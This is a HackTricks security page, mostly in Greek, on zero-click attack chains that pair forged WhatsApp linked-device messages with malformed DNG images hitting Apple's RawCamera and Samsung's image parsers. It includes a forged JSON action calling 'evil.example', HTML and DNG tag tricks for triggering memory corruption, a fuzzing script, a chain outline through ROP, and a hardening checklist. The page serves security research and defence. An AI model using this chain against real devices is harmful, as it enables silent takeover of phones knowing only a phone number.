# Zero-click Messaging → Image Parser Chains

{{#include ../../banners/hacktricks-training.md}}

## TL;DR

- Θεωρήστε τα messaging app multi-device/companion protocols ως κανάλια απομακρυσμένου ελέγχου: αν πεδία του πρωτοκόλλου θεωρούνται ότι προέρχονται από αξιόπιστες συσκευές, μπορεί παρόλα αυτά να ελέγχονται από τον χρήστη και συχνά να αναπαράγονται απευθείας εναντίον του θύματος για να φορτώσουν αυθαίρετο περιεχόμενο χωρίς καμία αλληλεπίδραση χρήστη.
- Μόλις οποιαδήποτε εφαρμογή εξαναγκαστεί να κάνει fetch μη αξιόπιστων media, στοχεύστε τον shared OS media pipeline (RawCamera on iOS/macOS, vendor parsers on Android OEM builds) με κακόμορφα αρχεία για να pivot-άρετε έξω από το sandbox.
- Τα DNG-based RawCamera και Samsung parser bugs που συζητιούνται εδώ είναι συγκεκριμένα παραδείγματα, αλλά η πλήρης τεχνική είναι ένα επαναχρησιμοποιήσιμο blueprint για την αλληλουχία των βημάτων logic flaws → image parser memory corruption → πλήρης αναλαμπή της συσκευής.

## Remote content loading via WhatsApp linked-device commands

### Attack surface recap

Η αρχιτεκτονική των WhatsApp "linked devices" κρατάει το primary phone και κάθε companion (desktop, tablet, secondary phone) σε συγχρονισμό μέσω κρυπτογραφημένων, δομημένων μηνυμάτων πρωτοκόλλου. Κάθε μήνυμα κωδικοποιεί:

- **Device metadata** (device ID, capabilities, feature flags).
- **Action descriptors** (π.χ., sync chats, fetch thumbnails, render remote content).
- **Arbitrary parameters** όπως URIs, MIME hints, pagination keys, κ.λπ.

Σε Apple clients, ο handler που επεξεργάζεται αυτά τα linked-device control packets **υποτιμητικά εμπιστευόταν** ότι έχει ήδη γίνει έγκυρο pairing, έτσι πεδία υψηλού αντίκτυπου (π.χ. `resource_url`, `open_media`, `sync_snapshot`) επαληθεύονταν ελάχιστα. Ένα κακόβουλο companion μήνυμα θα μπορούσε επομένως:

1. Να δρομολογηθεί σε οποιονδήποτε λογαριασμό προσδιορίζεται από τον αριθμό τηλεφώνου του.
2. Να επιβιώσει στο transport stack (Noise protocol + WhatsApp protobuf framing) επειδή ο παραλήπτης δεν επαλήθευσε ποτέ ότι ο αποστολέας ήταν νόμιμα paired device.
3. Να φτάσει στον iOS client, όπου το ευάλωτο code path ενεργοποιούσε αυτόματα ένα background HTTP(S) request προς το attacker URL και παρήγαγε την απάντηση σε ένα κρυφό WebView/media renderer.

### Practical workflow for auditors

1. **Capture legitimate linked-device traffic.** Συνδέστε έναν debugger ή Frida script στον desktop/iOS client και κάντε hook τον post-decryption handler (π.χ., `LinkedDevicesSyncHandler::processAction`). Dump-άρετε τα decoded protobuf payloads για να μάθετε τους διαθέσιμους τύπους actions και παραμέτρους.
2. **Identify fields that cross trust boundaries.** Οποιοδήποτε action περιέχει `http_url`, `thumbnail_uri`, `download_url`, ή `render_html` παραμέτρους χωρίς αυστηρές allow-lists είναι υποψήφιο remote-content primitive.
3. **Forge a malicious action.** Επαναχρησιμοποιήστε το παρατηρηθέν protobuf schema και τροποποιήστε μόνο τα attacker-controlled πεδία. Μια απλοποιημένη JSON όψη της σχετικής λογικής δομής δείχνεται παρακάτω (το πραγματικό transport είναι protobuf/Noise, αλλά τα σημασιολογικά πεδία ταιριάζουν):
```json
{
"op": "sync_action",
"device_id": "<attacker-companion>",
"payload": {
"target": "content_sync",
"resource_url": "https://evil.example/payload.html",
"media_type": "image/dng",
"flags": ["background_fetch", "render_inline"]
}
}
```
4. **Deliver to the victim.** Αναπαράγετε το κατασκευασμένο πακέτο μέσω της ίδιας υπηρεσίας WhatsApp που κανονικά προωθεί την κυκλοφορία linked-device (π.χ., χρησιμοποιώντας έναν τροποποιημένο desktop client ή έναν custom Noise client που επαναχρησιμοποιεί τα attacker account keys). Επειδή το CVE-2025-55177 απέτυχε να συνδέσει ενέργειες με authenticated devices, ο client του θύματος σε iOS/macOS θα αποδεχόταν το μήνυμα και θα έκανε αμέσως fetch το attacker URL χωρίς οποιοδήποτε UI.  
5. **Instrument the fetch.** Παρατηρήστε το εξαναγκασμένο HTTP(S) αίτημα και τον εσωτερικό renderer (WKWebView/ImageIO). Σε αυτό το σημείο έχετε μια zero-click web delivery primitive μέσα στο WhatsApp.

## Weaponizing auto-decoded DNGs against RawCamera

Μόλις ο επιτιθέμενος ελέγξει τι φορτώνει το WhatsApp, ο επόμενος στόχος είναι να κάνει το iOS/macOS να αναλύσει ένα κακόβουλο **Digital Negative (DNG)** αρχείο με το **RawCamera** framework. Οποιοδήποτε ενσωματωμένο `<img>`/CSS URL που επιλύεται σε `.dng` θα περάσει στην system image pipeline, καλώντας το RawCamera ακόμα κι αν το WhatsApp από μόνο του δεν χειρίστηκε ρητά DNGs.

### Triggering RawCamera from WhatsApp

- Σερβίρετε HTML που αναφέρεται στο DNG μέσω πολλαπλών μηχανισμών (π.χ., `<img src="evil.dng">`, CSS `background-image: url('evil.dng')`, ή `<picture>` sources) για να καλύψετε διαφορετικά render paths.
- Διασφαλίστε το σωστό MIME (`image/x-adobe-dng`) και μικρές προεπισκοπήσεις ώστε ο loader να μην εγκαταλείψει νωρίς λόγω heuristics μεγέθους.
- Το iOS media sandbox θα stream-άρει το αρχείο στο RawCamera μέσω `CGImageSourceCreateWithURL`, τελικά φτάνοντας τον ευάλωτο decoder.

### Crafting memory-corrupting DNGs (CVE-2025-43300 style)

Το αναπαραχθέν bug βασιζόταν σε ασυνεπή μεταδεδομένα που αποσυγχρόνιζαν την κατανομή buffer από τις πραγματικές αναγνώσεις pixel. Τυπικοί μοχλοί περιλαμβάνουν:

- **Tile/strip descriptors**: Ορίστε τα `TileByteCounts`/`StripByteCounts` σε ρεαλιστικές τιμές αλλά αυξήστε τα `TileOffsets` ώστε να δείχνουν πέρα από τον κατανεμημένο buffer.
- **Sub-IFD chains**: Ενσωματώστε δευτερεύουσες εικόνες με αντικρουόμενα `ImageWidth`/`ImageLength` και `BitsPerSample` ώστε το RawCamera να υπολογίσει μικρό buffer ενώ τα επόμενα στάδια εμπιστεύονται διαστάσεις που ελέγχονται από τον επιτιθέμενο.
- **Opcode metadata**: Τροποποιήστε τις εγγραφές `OpcodeList3` ώστε η επεξεργασία ανά γραμμή να λειτουργεί σε δείκτες επιλεγμένους από τον επιτιθέμενο.

Ένα βασικό mutation harness για ανίχνευση τέτοιων αλλοιώσεων μπορεί να κατασκευαστεί σε macOS, αφού ο ίδιος κώδικας RawCamera διανέμεται σε macOS/iOS/iPadOS:
```bash
#!/bin/bash
set -e
for sample in corpus/*.dng; do
radamsa "$sample" > /tmp/poc.dng
/System/Library/CoreServices/RawCamera.bundle/Contents/MacOS/RawCamera /tmp/poc.dng >/tmp/out 2>&1 || {
mv /tmp/poc.dng crashes/$(date +%s).dng
}
done
```
Κάθε crash στο `RawCamera` σου δίνει ένα νέο primitive. Το δημοσιευμένο PoC πέτυχε μια καθαρή ανάγνωση/εγγραφή εκτός ορίων αρκετά αξιόπιστη ώστε να προκαλέσει crash στο WhatsApp σε iPhone, iPad, και Mac.

## Κατασκευή της αλυσίδας 0-click

1. **Linked-device packet** → αναγκάζει το WhatsApp να φορτώσει `https://evil.example/payload.html` χωρίς κανένα πάτημα.
2. **Payload HTML** → αναφέρει σιωπηλά το `evil.dng`, εξασφαλίζοντας ότι το RawCamera καλείται από το OS media stack.
3. **Malicious DNG** → κακοποιεί διαμορφωμένα tags για να ενεργοποιήσει το RawCamera OOB και να crash/own τον image decoder.
4. **Post-corruption exploitation** → προσθέστε info-leak gadgets (π.χ. εκμετάλλευση προβλέψιμων heap metadata) και στήστε μια ROP/JOP chain για να διαφύγετε από το WhatsApp sandbox και να μεταβείτε σε πιο προνομιούχα περιβάλλοντα.

Επειδή κάθε βήμα είναι αυτόματο, ο επιτιθέμενος χρειάζεται μόνο τον αριθμό τηλεφώνου του θύματος. Δεν εμφανίζονται ειδοποιήσεις, banners ή προτροπές στη συσκευή-στόχο.

## Παραλληλισμοί με τον vendor image parser της Samsung

Το bulletin της Samsung για το CVE-2025-21043 επιβεβαίωσε ότι το ιδιόκτητο stack ανάλυσης εικόνων τους (που χρησιμοποιείται από το Gallery, Messages, και επίσης έμμεσα από το WhatsApp) υπέστη ένα **out-of-bounds write** προσβάσιμο μέσω μη αξιόπιστων μέσων. Η μεθοδολογία εκμετάλλευσης αντανακλά την αλυσίδα της Apple:

- Εντοπίστε έναν μηχανισμό αυτόματης προεπισκόπησης (chat thumbnails, notification previews, share sheets) που αναλύει το αρχείο του επιτιθέμενου με τις βιβλιοθήκες της Samsung `libimagecodec`/`libOneUI_ImageDecoder`.
- Diff ενημερώσεις βιβλιοθηκών OEM ή κάντε fuzz στους parsers με κακομορφωμένα RAW/DNG αρχεία μέχρι να δείτε καταστροφές μνήμης παρόμοιες με το crash του RawCamera (heap metadata clobber, register control, κ.λπ.).
- Παραδώστε το διαμορφωμένο αρχείο μέσω οποιουδήποτε καναλιού που ήδη φορτώνει αυτόματα περιεχόμενο (π.χ. το ίδιο linked-device primitive, οι WhatsApp preview fetchers, ή οι προεπισκοπήσεις waveform του Android push-to-talk).

Μόλις υπάρχει ένα OOB write στον vendor parser, ο συνδυασμός του με το WhatsApp auto-fetch primitive δίνει άλλη μια αλυσίδα zero-click σε συσκευές Samsung.

## Testing & hardening checklist

- **Protocol validation**: Επιβάλετε αυστηρές allow-lists για κάθε linked-device ενέργεια. Οι companion εντολές που ζητούν ένα fetch/render πρέπει να αποδεικνύουν το pairing της συσκευής (υπογράφοντας το payload) και το URL θα πρέπει να ταιριάζει με μια allow-list ή signed blob.
- **Transport replay countermeasures**: Δέστε κάθε ενέργεια σε ένα per-device key και απορρίψτε πακέτα των οποίων το sender key είναι άγνωστο, ακόμα κι αν η σύνταξη protobuf είναι σωστή.
- **Media pipeline restrictions**: Εφαρμογές υψηλού επιπέδου θα πρέπει να επιτρέπουν μόνο εγκεκριμένους MIME τύπους και να απορρίπτουν ρητά RAW/DNG εκτός αν η λειτουργία απαιτείται.
- **Parser fuzzing regression tests**: Διατηρήστε ένα corpus με κακομορφωμένα RAW/DNG αρχεία και τρέξτε τα ενάντια στους RawCamera/vendor decoders μετά από κάθε ενημέρωση.
- **Crash triage automation**: Επισυνάψτε sanitizers `DYLD_INSERT_LIBRARIES` ή MTE σε fuzz συσκευές για να εντοπίζονται λεπτές OOB καταστάσεις πριν από τους επιτιθέμενους.

## References

- [DNGerousLINK: A Deep Dive into WhatsApp 0-Click Exploits on iOS and Samsung Devices](https://media.ccc.de/v/39c3-dngerouslink-a-deep-dive-into-whatsapp-0-click-exploits-on-ios-and-samsung-devices)

{{#include ../../banners/hacktricks-training.md}}
